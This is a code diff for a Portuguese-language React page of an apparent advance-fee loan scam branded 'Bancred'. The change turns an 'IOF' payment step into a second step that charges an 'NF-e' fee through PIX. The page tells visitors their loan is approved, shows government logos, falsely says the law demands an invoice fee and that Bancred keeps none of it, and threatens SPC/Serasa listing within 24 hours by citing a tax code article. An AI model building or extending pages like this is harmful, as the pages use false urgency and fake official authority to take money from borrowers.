@@ -1,17 +1,19 @@
 import { useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import {
-  Landmark,
-  ShieldCheck,
-  Wallet,
-  FileText,
-  CircleCheck,
-  Clock,
+  LoaderCircle,
+  ScrollText,
+  Hash,
+  Sparkles,
+  ShieldAlert,
+  AlertCircle,
+  FileCheck,
   QrCode,
   Copy,
   Check,
   Loader2,
   X,
+  Clock,
 } from "lucide-react";
 import logo from "@/assets/bancred-logo.png";
 import receitaLogo from "@/assets/receita-federal-logo.svg";
@@ -33,30 +35,29 @@ const PixIcon = ({ size = 20 }: { size?: number }) => (
   </svg>
 );
 
-
-const Up1 = () => {
+const Up2 = () => {
   const [params] = useSearchParams();
   const navigate = useNavigate();
 
   const nomeRaw = params.get("nome") || "";
   const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();
-  const valorAprovado = 20000;
-  const valorIOF = 21.22;
+  const valorOperacao = Number(params.get("valor") || 5000);
+  const valorNFe = 32.9;
 
   const [showPix, setShowPix] = useState(false);
   const [copied, setCopied] = useState(false);
 
   const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
-    navigate(`/up2?${params.toString()}`);
+    // Próximo passo após pagamento da NF-e (a definir)
   });
 
   const openPix = async () => {
     setShowPix(true);
     try {
       await create({
-        amountCents: Math.round(valorIOF * 100),
-        description: `IOF Bancred - Liberação de crédito`,
-        stage: "iof",
+        amountCents: Math.round(valorNFe * 100),
+        description: `NF-e Bancred - Emissão obrigatória`,
+        stage: "up2",
         customer: nomeRaw ? { name: nomeRaw } : undefined,
       });
     } catch {
@@ -85,7 +86,7 @@ const Up1 = () => {
     <div
       style={{
         minHeight: "100dvh",
-        background: "#F4F4F7",
+        background: "#FFFBEB",
         fontFamily: fontStack,
         color: "#111827",
         WebkitFontSmoothing: "antialiased",
@@ -102,165 +103,244 @@ const Up1 = () => {
         <img src={logo} alt="Bancred" style={{ height: 76, width: "auto", display: "inline-block", objectFit: "contain" }} />
       </header>
 
-      <main style={{ padding: "18px 16px 26px", maxWidth: 480, margin: "0 auto" }}>
-        <section
+      <main style={{ padding: "18px 14px 28px", maxWidth: 480, margin: "0 auto" }}>
+        {/* Aprovado banner */}
+        <div
           style={{
-            background: "linear-gradient(160deg, #FFFFFF 0%, #EFF6FF 100%)",
-            border: "1px solid #E5E7EB",
-            borderRadius: 22,
-            padding: "22px 18px 18px",
+            background: "linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)",
+            borderWidth: "1px 1px 1px 4px",
+            borderStyle: "solid",
+            borderColor: "#A7F3D0 #A7F3D0 #A7F3D0 #059669",
+            borderRadius: 12,
+            padding: "12px 14px",
             marginBottom: 14,
-            boxShadow: "0 14px 34px rgba(17, 24, 39, 0.08)",
+            display: "flex",
+            alignItems: "center",
+            gap: 10,
           }}
         >
-          <div style={{ textAlign: "center", marginBottom: 18 }}>
-            <div
-              style={{
-                width: 76,
-                height: 76,
-                borderRadius: "50%",
-                background: "#FFFFFF",
-                color: "#1C68E3",
-                display: "inline-flex",
-                alignItems: "center",
-                justifyContent: "center",
-                marginBottom: 14,
-                border: "1px solid #DBEAFE",
-                boxShadow: "0 10px 22px rgba(28, 104, 227, 0.14)",
-              }}
-            >
-              <Landmark size={35} strokeWidth={2} />
+          <LoaderCircle size={20} color="#059669" style={{ flexShrink: 0, animation: "spin 1.5s linear infinite" }} />
+          <div style={{ flex: 1 }}>
+            <div style={{ fontSize: 12.5, fontWeight: 800, color: "#065F46", marginBottom: 2 }}>
+              ✅ Empréstimo APROVADO e em processamento
             </div>
-            <div
-              style={{
-                display: "inline-flex",
-                alignItems: "center",
-                gap: 6,
-                padding: "6px 10px",
-                borderRadius: 999,
-                background: "#DBEAFE",
-                color: "#1751B5",
-                fontSize: 12,
-                fontWeight: 800,
-                marginBottom: 10,
-              }}
-            >
-              <ShieldCheck size={14} /> Etapa fiscal obrigatória
+            <div style={{ fontSize: 11.5, color: "#047857", lineHeight: 1.4 }}>
+              Falta apenas <strong>1 etapa fiscal</strong> para o valor cair na sua conta
             </div>
-            <h1 style={{ fontSize: 24, fontWeight: 900, color: "#111827", marginBottom: 8, lineHeight: 1.16 }}>
-              {primeiroNome}, falta quitar o IOF do seu crédito
-            </h1>
-            <p style={{ fontSize: 14, lineHeight: 1.55, color: "#6B7280", margin: 0 }}>
-              O IOF é o Imposto sobre Operações Financeiras, uma cobrança federal obrigatória em operações de crédito.
-              Ele precisa ser regularizado para concluir a formalização e liberar o contrato.
-            </p>
           </div>
+        </div>
+        <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
+
+        {/* NF-e card */}
+        <section
+          style={{
+            background: "#FFFFFF",
+            borderWidth: "4px 1px 1px",
+            borderStyle: "solid",
+            borderColor: "#B45309 #FEF3C7 #FEF3C7",
+            borderRadius: 14,
+            padding: "18px 18px 16px",
+            marginBottom: 14,
+            boxShadow: "0 10px 28px rgba(180, 83, 9, 0.08)",
+            position: "relative",
+          }}
+        >
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "space-between",
+              borderBottom: "1px dashed #FEF3C7",
+              paddingBottom: 12,
+              marginBottom: 14,
+            }}
+          >
+            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+              <ScrollText size={18} color="#B45309" />
+              <div style={{ fontSize: 11, fontWeight: 800, color: "#78350F", letterSpacing: 0.6, textTransform: "uppercase" }}>
+                Exigência Fiscal — Receita Federal
+              </div>
+            </div>
+            <div
+              style={{
+                display: "inline-flex",
+                alignItems: "center",
+                gap: 4,
+                fontSize: 10,
+                fontWeight: 700,
+                color: "#B45309",
+                background: "#FFFBEB",
+                border: "1px solid #FEF3C7",
+                padding: "4px 8px",
+                borderRadius: 6,
+              }}
+            >
+              <Hash size={10} /> 420658-NF
+            </div>
+          </div>
+
+          <h1 style={{ fontSize: 22, fontWeight: 900, color: "#111827", marginBottom: 8, lineHeight: 1.2 }}>
+            {primeiroNome}, seu empréstimo já foi aprovado — falta só a NF-e
+          </h1>
+          <p style={{ fontSize: 13.5, lineHeight: 1.55, color: "#6B7280", margin: "0 0 14px" }}>
+            Operações acima de R$&nbsp;3.000,00 são <strong style={{ color: "#78350F" }}>obrigadas por lei</strong> a emitir Nota Fiscal Eletrônica antes do repasse. Esta exigência é do <strong>Governo Federal</strong> — não é uma cobrança da Bancred.
+          </p>
 
           <div
             style={{
-              background: "#FFFFFF",
-              borderRadius: 16,
-              padding: 16,
-              border: "1px solid #DBEAFE",
+              background: "#FFFBEB",
+              border: "1px solid #FEF3C7",
+              borderRadius: 10,
+              padding: "12px 14px",
+              display: "grid",
+              gap: 8,
             }}
           >
-            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 12 }}>
-              <div>
-                <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>Crédito aprovado</div>
-                <div style={{ fontSize: 30, fontWeight: 900, color: "#1C68E3" }}>{formatBRL(valorAprovado)}</div>
+            {[
+              { k: "Beneficiário", v: nomeRaw ? nomeRaw.split(" ").slice(0, 2).join(" ") : "Cliente", big: false },
+              { k: "Valor da operação", v: formatBRL(valorOperacao), big: true },
+              { k: "Natureza", v: "Crédito pessoal", big: false },
+            ].map((row) => (
+              <div key={row.k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8 }}>
+                <span style={{ fontSize: 11.5, color: "#6B7280", textTransform: "uppercase", letterSpacing: 0.5, fontWeight: 600 }}>
+                  {row.k}
+                </span>
+                <span style={{ fontSize: row.big ? 15 : 13, color: "#111827", fontWeight: row.big ? 900 : 600 }}>
+                  {row.v}
+                </span>
               </div>
-              <span
-                style={{
-                  width: 48,
-                  height: 48,
-                  borderRadius: "50%",
-                  background: "#FFFFFF",
-                  color: "#1C68E3",
-                  display: "inline-flex",
-                  alignItems: "center",
-                  justifyContent: "center",
-                  flexShrink: 0,
-                }}
-              >
-                <Wallet size={24} />
-              </span>
-            </div>
+            ))}
           </div>
         </section>
 
+        {/* Steps */}
         <div
           style={{
             background: "#FFFFFF",
             borderRadius: 16,
-            padding: 18,
-            boxShadow: "0 1px 2px rgba(17, 24, 39, 0.04), 0 4px 12px rgba(17, 24, 39, 0.04)",
+            padding: 16,
+            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
             border: "1px solid #E5E7EB",
             marginBottom: 14,
           }}
         >
-          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
-            <span
-              style={{
-                width: 34,
-                height: 34,
-                borderRadius: "50%",
-                background: "#F0FDF4",
-                color: "#16A34A",
-                display: "inline-flex",
-                alignItems: "center",
-                justifyContent: "center",
-                flexShrink: 0,
-              }}
-            >
-              <FileText size={18} />
-            </span>
-            <div>
-              <div style={{ fontSize: 15, fontWeight: 900, color: "#111827" }}>Por que o IOF é obrigatório?</div>
-              <div style={{ fontSize: 12, color: "#6B7280" }}>Registro fiscal da operação financeira</div>
+          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 14 }}>
+            <Sparkles size={16} color="#B45309" />
+            <div style={{ fontSize: 14, fontWeight: 800, color: "#111827" }}>
+              Após o pagamento da NF-e (em até 5 minutos):
             </div>
           </div>
           {[
-            "Imposto federal obrigatório para contratos de crédito",
-            "Necessário para emitir e validar a operação financeira",
-            "Liberação automática do crédito após a confirmação do PIX",
-          ].map((t) => (
-            <div key={t} style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#111827", marginBottom: 7 }}>
-              <CircleCheck size={14} color="#16A34A" /> {t}
+            "NF-e emitida automaticamente em seu CPF",
+            "Registro confirmado junto à Receita Federal",
+            `Crédito de ${formatBRL(valorOperacao)} liberado direto na sua conta`,
+          ].map((t, i) => (
+            <div key={t} style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: i < 2 ? 10 : 0 }}>
+              <span
+                style={{
+                  flexShrink: 0,
+                  width: 22,
+                  height: 22,
+                  borderRadius: "50%",
+                  background: "#B45309",
+                  color: "#fff",
+                  fontSize: 11,
+                  fontWeight: 800,
+                  display: "inline-flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                }}
+              >
+                {i + 1}
+              </span>
+              <div style={{ fontSize: 13, color: "#111827", lineHeight: 1.5, paddingTop: 1 }}>{t}</div>
             </div>
           ))}
         </div>
 
+        {/* Warning */}
+        <div
+          style={{
+            background: "#FEF2F2",
+            borderWidth: "1.5px 1.5px 1.5px 4px",
+            borderStyle: "solid",
+            borderColor: "#FCA5A5 #FCA5A5 #FCA5A5 #DC2626",
+            borderRadius: 10,
+            padding: 14,
+            marginBottom: 14,
+            display: "flex",
+            gap: 10,
+          }}
+        >
+          <ShieldAlert size={22} color="#DC2626" style={{ flexShrink: 0, marginTop: 1 }} />
+          <div style={{ fontSize: 12.5, color: "#7F1D1D", lineHeight: 1.55 }}>
+            <div style={{ fontWeight: 900, fontSize: 13, marginBottom: 6, color: "#991B1B", textTransform: "uppercase", letterSpacing: 0.3 }}>
+              ⚠️ Atenção: prazo de 24h
+            </div>
+            O não pagamento da NF-e dentro do prazo resulta em <strong>inscrição automática do CPF nos órgãos de proteção ao crédito (SPC e Serasa)</strong>, conforme o Art. 39 do Código Tributário Nacional. Seu nome ficará <strong>negativado</strong> e o empréstimo aprovado será <strong>cancelado sem possibilidade de reabertura</strong>.
+          </div>
+        </div>
+
+        {/* Info Bancred não recebe */}
+        <div
+          style={{
+            background: "#FFFBEB",
+            borderWidth: "1px 1px 1px 4px",
+            borderStyle: "solid",
+            borderColor: "#FEF3C7 #FEF3C7 #FEF3C7 #B45309",
+            borderRadius: 10,
+            padding: "12px 14px",
+            marginBottom: 14,
+            display: "flex",
+            gap: 10,
+          }}
+        >
+          <AlertCircle size={20} color="#B45309" style={{ flexShrink: 0, marginTop: 1 }} />
+          <div style={{ fontSize: 12.5, color: "#78350F", lineHeight: 1.55 }}>
+            O valor da NF-e é repassado diretamente à Receita Federal. A Bancred <strong>não recebe nada</strong> dessa taxa — é uma exigência exclusiva do Governo.
+          </div>
+        </div>
+
+        {/* Valor */}
         <div
           style={{
             background: "#FFFFFF",
-            borderRadius: 16,
-            padding: 18,
-            boxShadow: "0 1px 2px rgba(17, 24, 39, 0.04), 0 4px 12px rgba(17, 24, 39, 0.04)",
-            border: "1px solid #D1D5DB",
+            border: "1px solid #FEF3C7",
+            borderRadius: 14,
+            padding: "16px 18px",
             marginBottom: 18,
+            position: "relative",
+            overflow: "hidden",
           }}
         >
-          <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12 }}>
-            <div>
-              <div style={{ fontSize: 13, color: "#6B7280", marginBottom: 4 }}>IOF da operação de crédito</div>
-              <div style={{ fontSize: 34, fontWeight: 900, color: "#1C68E3", marginBottom: 8 }}>{formatBRL(valorIOF)}</div>
-            </div>
-            <div
-              style={{
-                padding: "6px 10px",
-                borderRadius: 999,
-                background: "#FFF7ED",
-                color: "#C2410C",
-                fontSize: 12,
-                fontWeight: 800,
-                whiteSpace: "nowrap",
-              }}
-            >
-              Pendente
-            </div>
+          <div
+            style={{
+              position: "absolute",
+              top: 12,
+              right: 12,
+              padding: "4px 10px",
+              border: "1.5px solid #B45309",
+              color: "#B45309",
+              borderRadius: 6,
+              fontSize: 10,
+              fontWeight: 900,
+              letterSpacing: 1,
+              textTransform: "uppercase",
+              transform: "rotate(-6deg)",
+              opacity: 0.85,
+            }}
+          >
+            A Pagar
           </div>
-          <div style={{ fontSize: 13, lineHeight: 1.55, color: "#6B7280", borderTop: "1px solid #E5E7EB", paddingTop: 12 }}>
-            Esse imposto é vinculado ao CPF e ao valor aprovado, sendo exigido antes da liberação para registrar a operação dentro das normas financeiras.
+          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
+            <FileCheck size={16} color="#B45309" />
+            <div style={{ fontSize: 12, color: "#6B7280", fontWeight: 600 }}>Taxa de emissão da NF-e</div>
+          </div>
+          <div style={{ fontSize: 36, fontWeight: 900, color: "#78350F", lineHeight: 1, marginBottom: 6 }}>
+            {formatBRL(valorNFe)}
+          </div>
+          <div style={{ fontSize: 12, color: "#6B7280", lineHeight: 1.5 }}>
+            Valor único e final. Sem mensalidades, sem cobranças adicionais.
           </div>
         </div>
 
@@ -278,7 +358,7 @@ const Up1 = () => {
             fontWeight: 700,
             letterSpacing: -0.2,
             cursor: "pointer",
-            boxShadow: "0 8px 24px rgba(22, 163, 74, 0.25)",
+            boxShadow: "0 8px 24px rgba(22,163,74,0.25)",
             display: "inline-flex",
             alignItems: "center",
             justifyContent: "center",
@@ -287,7 +367,7 @@ const Up1 = () => {
             minHeight: 52,
           }}
         >
-          <PixIcon size={20} /> Pagar IOF e liberar crédito
+          <PixIcon size={20} /> Emitir NF-e e liberar crédito
         </button>
 
         <footer style={{ marginTop: 22, textAlign: "center" }}>
@@ -296,8 +376,8 @@ const Up1 = () => {
             <div style={{ width: 1, height: 46, background: "#E5E7EB" }} />
             <img src={govbrLogo} alt="gov.br" style={{ height: 32, width: "auto", opacity: 0.9, display: "block" }} />
           </div>
-          <div style={{ fontSize: 11, lineHeight: 1.45, color: "#6B7280" }}>
-            IOF vinculado às diretrizes fiscais aplicáveis às operações financeiras.
+          <div style={{ fontSize: 10.5, lineHeight: 1.5, color: "#6B7280", maxWidth: 320, margin: "0 auto" }}>
+            Documento emitido em conformidade com as normas da Receita Federal do Brasil. Operação registrada e auditável.
           </div>
         </footer>
       </main>
@@ -335,7 +415,7 @@ const Up1 = () => {
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
               <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                 <PixIcon size={22} />
-                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar IOF com PIX</span>
+                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar NF-e com PIX</span>
               </div>
               <button
                 type="button"
@@ -362,7 +442,7 @@ const Up1 = () => {
               <div>
                 <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                 <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>
-                  {formatBRL(valorIOF)}
+                  {formatBRL(valorNFe)}
                 </div>
               </div>
               <div
@@ -387,7 +467,6 @@ const Up1 = () => {
               <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                 <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
                 <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>{pixError ? pixError : "Gerando seu código PIX..."}</div>
-                <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
               </div>
             ) : (
               <>
@@ -453,24 +532,6 @@ const Up1 = () => {
                 >
                   {copied ? <Check size={18} /> : <Copy size={18} />} {copied ? "Copiado!" : "Copiar código PIX"}
                 </button>
-
-                <div
-                  style={{
-                    marginTop: 12,
-                    background: "#EFF6FF",
-                    border: "1px solid #DBEAFE",
-                    borderRadius: 12,
-                    padding: "12px 14px",
-                    display: "flex",
-                    alignItems: "center",
-                    gap: 10,
-                    color: "#1751B5",
-                    fontSize: 13,
-                  }}
-                >
-                  <Loader2 size={16} style={{ animation: "spin 1.4s linear infinite", flexShrink: 0 }} />
-                  Aguardando confirmação do pagamento...
-                </div>
               </>
             )}
           </div>
@@ -480,4 +541,4 @@ const Up1 = () => {
   );
 };
 
-export default Up1;
+export default Up2;
